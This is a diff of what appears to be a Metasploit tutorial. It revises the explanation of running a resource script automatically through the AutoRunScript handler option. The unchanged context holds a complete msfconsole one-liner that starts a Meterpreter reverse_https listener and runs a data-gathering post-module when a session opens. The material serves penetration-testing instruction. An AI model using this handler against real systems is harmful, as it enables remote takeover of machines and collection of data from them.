@@ -169,8 +169,8 @@
 
 <br />
 
-- **Handler::AutoRunScript::**`[bash prompt]`<br />
-<blockquote>This next example demonstrates how we can auto-run our resource script automatically at session creation with the help of @darkoperator 'post/multi/gather/multi_command.rb' and msfconsole AutoRunScript handler flag, for this to work we need to define a global variable (setg <option>) to call our resource script at session creation.</blockquote>
+- **Handler::AutoRunScript::OneLiner::**`[bash prompt]`<br />
+<blockquote>This next example demonstrates how we can auto-run our resource script automatically at session creation without the need to write script.rc (thats going to trigger 'gather.rc'). In this example we set a global variable (setg resource <path-to-our-script.rc>) before load/config the multi/handler AutoRunScript flag that allow us to trigger the @darkopeator multi_command module.</blockquote>
 
       sudo msfconsole -x 'setg /root/gather.rc; use exploit/multi/handler; set LHOST 192.168.1.71; set LPORT 666; set PAYLOAD windows/meterpreter/reverse_https; set AutoRunScript post/multi/gather/multi_command; exploit'
 
